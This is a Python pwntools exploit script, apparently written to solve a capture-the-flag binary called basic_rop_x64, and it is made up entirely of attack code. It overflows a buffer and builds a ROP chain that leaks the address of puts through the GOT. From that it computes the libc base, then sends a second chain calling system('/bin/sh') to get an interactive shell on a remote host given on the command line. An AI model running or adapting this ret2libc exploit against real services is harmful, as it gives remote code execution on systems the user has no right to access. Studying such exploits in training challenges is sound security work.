#!/usr/bin/env python3
import sys
from pwn import *

context.arch = "amd64"

HOST = sys.argv[1]
PORT = int(sys.argv[2])

elf = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
rop = ROP(elf)

offset = 72
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main = elf.sym["main"]

p = remote(HOST, PORT)


p.send(flat(
    b"a"*offset,
    pop_rdi,
    puts_got,
    puts_plt,
    main
))
p.recvn(0x40)

leaked_puts = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leaked_puts - libc.sym["puts"]
system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

p.send(flat(
    b"a"*offset,
    ret,
    pop_rdi,
    bin_sh,
    system
))
p.recvn(0x40)

p.interactive()